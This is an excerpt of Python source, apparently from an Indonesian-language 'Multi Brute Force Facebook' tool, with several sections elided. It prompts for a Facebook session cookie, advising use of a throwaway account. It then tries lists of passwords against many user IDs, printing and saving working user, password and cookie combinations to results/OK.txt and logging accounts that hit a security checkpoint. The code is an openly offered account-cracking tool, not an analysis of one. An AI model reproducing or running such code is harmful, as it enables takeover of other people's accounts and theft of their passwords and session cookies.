...
class login:
    ...
    def logoo(self):
        self.clear()
        prints(Panel(f"""\n{RC}
███████████████████████████████	   {J2}	★ Developer : Rendi_VXI█
█▄─▄─▀█▄─▄▄▀█▄─██─▄█─▄─▄─█▄─▄▄─█   {RC}	★ Github : MhndRenzz
██─▄─▀██─▄─▄██─██─████─████─▄█▀█   {RC}	★ Multi Brute Fource Facebook
▀▄▄▄▄▀▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▄▀\n""",padding=(0,7),style=f"#AAAAAA"))
    
    def loginEfbi(self):
        self.logoo()
        prints(Panel(f"{O2}Your Login Cookies ★ Utamakan Pake Akun Tumbal",padding=(0,2),style=f"#AAAAAA"))
        coki = console.input(f" {O2}({H2}•{O2}) masukan cookie facebook : ")
...
█▄─▄─▀█▄─▄▄▀█▄─██─▄█─▄─▄─█▄─▄▄─█   {RC}	★ Github : MhndRenzz
██─▄─▀██─▄─▄██─██─████─████─▄█▀█   {RC}	★ Multi Brute Fource Facebook
▀▄▄▄▄▀▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▄▀\n""",title=f"{P2}halo, {H2}{self.Time()}",subtitle=f"{P2}version {RC}1.0.5",padding=(0,7),style=f"#AAAAAA"))
    ...
    def tampung(self):
         prints(Panel(f"{P2}[ {H2}hasil crack akan di simpan di dalam folder results brute {P2}]",width=80,padding=(0,11),style=f"#AAAAAA"))
    ...
    def regular(self, user, pwx):
        ...
        sys.stdout.write(f'\r {P}({H}•{P}) Running {H}X.facebook {P}{loop}/{len(ID)}{P} SUCCSESS-:{H}{len(ok)} {P}CHEKPOINT-:{K}{len(cp)}{P}');sys.stdout.flush()
        for pw in pwx:
             try:
                 ...
                 if 'c_user' in ses.cookies.get_dict():
                     ...
                     print(f"\r  {P}[OK] {H}{user}|{pw}|{coki}|{ua}{P}")
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     print(f"\r  {P}[CP]{K} {user}|{pw}|{ua}{P}                    ")
